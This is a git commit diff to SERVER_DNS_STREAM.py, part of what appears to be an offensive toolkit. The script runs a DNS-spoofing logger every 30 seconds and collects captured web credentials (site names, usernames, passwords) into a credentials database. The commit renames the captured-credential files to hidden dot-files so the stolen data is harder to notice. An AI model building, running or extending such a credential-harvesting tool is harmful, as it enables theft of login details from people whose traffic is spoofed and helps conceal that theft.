8bb7e43d2d7d8f8ccfbc1deb9e3f4e46dcf007a3
jac11 <jac11devel@gmail.com>
2025-05-26 14:34:56 -0400

    Add files via upload

--- Snake_Package/ServerLog/SERVER_DNS_STREAM.py
+++ Snake_Package/ServerLog/SERVER_DNS_STREAM.py
@@ -14,12 +14,12 @@ printH = " " + "-" * 103 +'\n'
 printH += "| " + f"{'       Site-Name    ':<20}"+ ' |' + f"{'       auth_user    ':<35}"+ "  | " + f"{'         PASSWORD   ':<39}  |"+'\n'
 printH += " " + "-" * 103
 Note = '\n'+('='*20)+'\n[+] Important Note '+'\n'+('='*20)+'\n'+'[+] This File read in real Time will be Update evey 30 Seconds'+'\n'+('='*40)+'\n'
-if os.path.exists(Path_St+'SERVLOGIN_DB.txt'):
-    with open (Path_St+'SERVLOGIN_DB.txt','r')as reas_DB :
+if os.path.exists(Path_St+'.SERVLOGIN_DB.txt'):
+    with open (Path_St+'.SERVLOGIN_DB.txt','r')as reas_DB :
         read_data = reas_DB.readlines()
-    with open(Path_DB_PASS+'/WEB_AUTH_db.txt','r') as read_list : 
+    with open(Path_DB_PASS+'/.WEB_AUTH_db.txt','r') as read_list : 
         read_list_DB = read_list.readlines()
-    with open(Path_DB_PASS+'/WEB_AUTH_db.txt','a') as DB_PASS :       
+    with open(Path_DB_PASS+'/.WEB_AUTH_db.txt','a') as DB_PASS :       
         for d in read_data :
             if  d in read_list_DB :
                 pass
@@ -27,9 +27,9 @@ if os.path.exists(Path_St+'SERVLOGIN_DB.txt'):
                  write_data = DB_PASS.write(d)
 else:          
     
-    with open(Path_DB_PASS+'/WEB_AUTH_db.txt','w') as DB_PASS :  
+    with open(Path_DB_PASS+'/.WEB_AUTH_db.txt','w') as DB_PASS :  
         DB_PASS.write("\n Web Credentials DataBases\n"+'='*40+'\n'+printH)
-with open (Path_St+'SERVLOGIN_DB.txt','w')as reas_DB:
+with open (Path_St+'.SERVLOGIN_DB.txt','w')as reas_DB:
     with open(Path_St+'log_error.log','w') as Log_Handel :
           with open(Path_St+'log_access.log','w') as Log_Handel :
                 pass
@@ -46,11 +46,11 @@ class Read_Stream_Update :
                  remotefile = "python "+ Path_St +'DNS_SPOOFING_LOG.py'
                  #call_termminal = subprocess.call(remotefile,shell=True,stderr=subprocess.PIPE)
                  os.system(remotefile)
-                 with open(Path_St+'SERVLOGIN_DB.txt','r') as filedb :
+                 with open(Path_St+'.SERVLOGIN_DB.txt','r') as filedb :
                     db_file = filedb.read()
                    
                     with open(f"{Path_St}.CopyData",'r') as Copy,\
-                    open (Path_St+'SERVLOGIN_DB.txt','a')as reas_DB :
+                    open (Path_St+'.SERVLOGIN_DB.txt','a')as reas_DB :
                         Copy = Copy.readlines()
                         if "@" not in Copy[-1]:
                             pass
@@ -59,14 +59,16 @@ class Read_Stream_Update :
                     with open(f"{Path_St}.CopyData",'r') as printdata :
                         sys.stdout.write('\033[H\033[2J\033[3J')
                         sys.stdout.flush()
-                        print(printdata.read()) 
+                        print(printdata.read())
+                        pass
+
                     time.sleep(30)
         except KeyboardInterrupt :             
-                with open (Path_St+'SERVLOGIN_DB.txt','r')as reas_DB :
+                with open (Path_St+'.SERVLOGIN_DB.txt','r')as reas_DB :
                     read_data = reas_DB.readlines()
-                with open(Path_DB_PASS+'/WEB_AUTH_db.txt','r') as read_list : 
+                with open(Path_DB_PASS+'/.WEB_AUTH_db.txt','r') as read_list : 
                     read_list_DB = read_list.readlines()
-                with open(Path_DB_PASS+'/WEB_AUTH_db.txt','a') as DB_PASS :       
+                with open(Path_DB_PASS+'/.WEB_AUTH_db.txt','a') as DB_PASS :       
                     for d in read_data :
                         if  d in read_list_DB :
                             pass
